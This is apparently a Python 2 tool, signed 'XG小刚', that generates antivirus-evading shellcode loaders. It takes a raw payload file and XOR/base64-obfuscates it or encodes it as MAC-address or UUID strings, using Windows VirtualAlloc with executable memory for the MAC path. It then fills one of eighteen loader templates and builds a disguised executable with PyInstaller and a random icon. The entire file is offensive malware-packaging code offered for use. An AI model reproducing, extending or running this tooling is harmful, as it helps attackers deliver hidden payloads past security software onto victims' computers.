# -*- coding: UTF-8 -*-

import random
import base64
import ctypes
import sys
import uuid
from string import Template
import os

temper_list = ["RMM_loader1/2/3","REG_loader1/2/3","MAC_loader1/2/3","UUID_loader1/2/3","ipv4_temper1/2/3","ipv6_temper1/2/3"]
temp_files = {
    'RMM_loader1': './loader_temper/RMM_temper1.py',
    'RMM_loader2': './loader_temper/RMM_temper2.py',
    'RMM_loader3': './loader_temper/RMM_temper3.py',
    'REG_loader1': './loader_temper/REG_temper1.py',
    'REG_loader2': './loader_temper/REG_temper2.py',
    'REG_loader3': './loader_temper/REG_temper3.py',
    'MAC_loader1': './loader_temper/MAC_temper1.py',
    'MAC_loader2': './loader_temper/MAC_temper2.py',
    'MAC_loader3': './loader_temper/MAC_temper3.py',
    'UUID_loader1': './loader_temper/UUID_temper1.py',
    'UUID_loader2': './loader_temper/UUID_temper2.py',
    'UUID_loader3': './loader_temper/UUID_temper3.py',
    'ipv4_loader1': './loader_temper/ipv4_temper1.py',
    'ipv4_loader2': './loader_temper/ipv4_temper2.py',
    'ipv4_loader3': './loader_temper/ipv4_temper3.py',
    'ipv6_loader1': './loader_temper/ipv6_temper1.py',
    'ipv6_loader2': './loader_temper/ipv6_temper2.py',
    'ipv6_loader3': './loader_temper/ipv6_temper3.py',


}
result_Files = {
    'RMM_loader1': './loader_result/RMM_loader1.py',
    'RMM_loader2': './loader_result/RMM_loader2.py',
    'RMM_loader3': './loader_result/RMM_loader3.py',
    'REG_loader1': './loader_result/REG_loader1.py',
    'REG_loader2': './loader_result/REG_loader2.py',
    'REG_loader3': './loader_result/REG_loader3.py',
    'MAC_loader1': './loader_result/MAC_loader1.py',
    'MAC_loader2': './loader_result/MAC_loader2.py',
    'MAC_loader3': './loader_result/MAC_loader3.py',
    'UUID_loader1': './loader_result/UUID_loader1.py',
    'UUID_loader2': './loader_result/UUID_loader2.py',
    'UUID_loader3': './loader_result/UUID_loader3.py',
    'ipv4_loader1': './loader_result/ipv4_loader1.py',
    'ipv4_loader2': './loader_result/ipv4_loader2.py',
    'ipv4_loader3': './loader_result/ipv4_loader3.py',
    'ipv6_loader1': './loader_result/ipv6_loader1.py',
    'ipv6_loader2': './loader_result/ipv6_loader2.py',
    'ipv6_loader3': './loader_result/ipv6_loader3.py',
}


def xor_encode(string, module='encode', key=random.randint(1, 255)):
    if module == 'encode':
        buf = bytearray(string)
        encode_code = b''
        for i in buf:
            b = (255 - i) ^ key
            encode_code += chr(b).encode('hex')
        encode_code += chr(key).encode('hex')
        result = base64.b64encode(encode_code)
        return result
    elif module == 'decode':
        decode_code = bytearray(base64.b64decode(string).decode('hex'))
        sh3llc0de = bytearray()
        key = decode_code[-1]
        for i in decode_code[0:-1]:
            b = 255 - (i ^ key)
            sh3llc0de.append(b)
        return sh3llc0de
    else:
        print('module not fund')


def mac_encode(string):
    if len(string)%6 != 0:
        string+=b"\x00"*6
    list = []
    macmem = ctypes.windll.kernel32.VirtualAlloc(0, len(string) / 6 * 17, 0x3000, 0x40)
    for i in range(len(string) / 6):
        bytes_a = string[i * 6:6 + i * 6]
        ctypes.windll.Ntdll.RtlEthernetAddressToStringA(bytes_a, macmem + i * 17)
    for i in range(len(string) / 6):
        d = ctypes.string_at(macmem + i * 17, 17)
        list.append(d)
    return list


def uuid_encode(string):
    if len(string)%16 != 0:
        string+=b"\x00"*16
    list = []
    for i in range(len(string) / 16):
        bytes_a = string[i * 16:16 + i * 16]
        b = uuid.UUID(bytes_le=bytes_a)
        list.append(str(b))
    return list


def convertFromTemplate(parameters, templateFile):
    try:
        with open(templateFile) as f:
            src = Template(f.read())
            result = src.substitute(parameters)
            f.close()
            return result
    except IOError:
        print("create template error")
        return None


if __name__ == '__main__':
    if len(sys.argv) == 3:
        if sys.argv[2].find("MAC") == 0:
            data = open(sys.argv[1], 'rb').read()
            tamper_file_path = temp_files[sys.argv[2]]
            sh3llc0de_m = mac_encode(data)
            result = convertFromTemplate({'sh3llc0de_m': sh3llc0de_m},tamper_file_path)
            file = open(result_Files[sys.argv[2]],"w")
            file.write(result)
            file.close()
            print("create loader :{}".format(result_Files[sys.argv[2]]))
            os.system("pyinstaller {} --onefile --icon=./icon_file/s{}.ico --workpath=./loader_result/ --specpath=./loader_result/ --distpath=./loader_result/ --clean -y".format(result_Files[sys.argv[2]],str(random.randint(1,10))))
            print("create exe :{}".format(result_Files[sys.argv[2]]))
        elif sys.argv[2].find("UUID") == 0:
            data = open(sys.argv[1], 'rb').read()
            tamper_file_path = temp_files[sys.argv[2]]
            sh3llc0de_m = uuid_encode(data)
            result = convertFromTemplate({'sh3llc0de_m': sh3llc0de_m},tamper_file_path)
            file = open(result_Files[sys.argv[2]],"w")
            file.write(result)
            file.close()
            print("create loader :{}".format(result_Files[sys.argv[2]]))
            os.system("pyinstaller {} --onefile --icon=./icon_file/s{}.ico --workpath=./loader_result/ --specpath=./loader_result/ --distpath=./loader_result/ --clean -y".format(result_Files[sys.argv[2]],str(random.randint(1,10))))
            print("create exe :{}".format(result_Files[sys.argv[2]]))
        elif sys.argv[2].find("RMM") == 0:
            data = open(sys.argv[1], 'rb').read()
            tamper_file_path = temp_files[sys.argv[2]]
            sh3llc0de_m = xor_encode(data)
            result = convertFromTemplate({'sh3llc0de_m': sh3llc0de_m},tamper_file_path)
            file = open(result_Files[sys.argv[2]],"w")
            file.write(result)
            file.close()
            print("create loader :{}".format(result_Files[sys.argv[2]]))
            os.system("pyinstaller {} --onefile --icon=./icon_file/s{}.ico --workpath=./loader_result/ --specpath=./loader_result/ --distpath=./loader_result/ --clean -y".format(result_Files[sys.argv[2]],str(random.randint(1,10))))
            print("create exe :{}".format(result_Files[sys.argv[2]]))
        elif sys.argv[2].find("REG") == 0:
            data = open(sys.argv[1], 'rb').read()
            tamper_file_path = temp_files[sys.argv[2]]
            sh3llc0de_m = xor_encode(data)
            result = convertFromTemplate({'sh3llc0de_m': sh3llc0de_m},tamper_file_path)
            file = open(result_Files[sys.argv[2]],"w")
            file.write(result)
            file.close()
            print("create loader :{}".format(result_Files[sys.argv[2]]))
            os.system("pyinstaller {} --onefile --icon=./icon_file/s{}.ico --workpath=./loader_result/ --specpath=./loader_result/ --distpath=./loader_result/ --clean -y".format(result_Files[sys.argv[2]],str(random.randint(1,10))))
            print("create exe :{}".format(result_Files[sys.argv[2]]))
        elif sys.argv[2].find("ipv") == 0:
            data = open(sys.argv[1], 'rb').read()
            tamper_file_path = temp_files[sys.argv[2]]
            sh3llc0de_m = xor_encode(data)
            result = convertFromTemplate({'sh3llc0de_m': sh3llc0de_m},tamper_file_path)
            file = open(result_Files[sys.argv[2]],"w")
            file.write(result)
            file.close()
            print("create loader :{}".format(result_Files[sys.argv[2]]))
            os.system("pyinstaller {} --onefile --icon=./icon_file/s{}.ico --workpath=./loader_result/ --specpath=./loader_result/ --distpath=./loader_result/ --clean -y".format(result_Files[sys.argv[2]],str(random.randint(1,10))))
            print("create exe :{}".format(result_Files[sys.argv[2]]))
        else:
            print("not fund module")
    else:
        print("XG隐地_V1.0(测试版)  by: XG小刚\n")
        print("temper_list (20210913): {}".format(temper_list))
        print("usege : python2 {} [shellcode] [loader_temper]".format(sys.argv[0]))
        print("usage : python2 {} payload.bin UUID_loader1".format(sys.argv[0]))
        print("usage : python2 {} 123.bin RMM_loader1".format(sys.argv[0]))

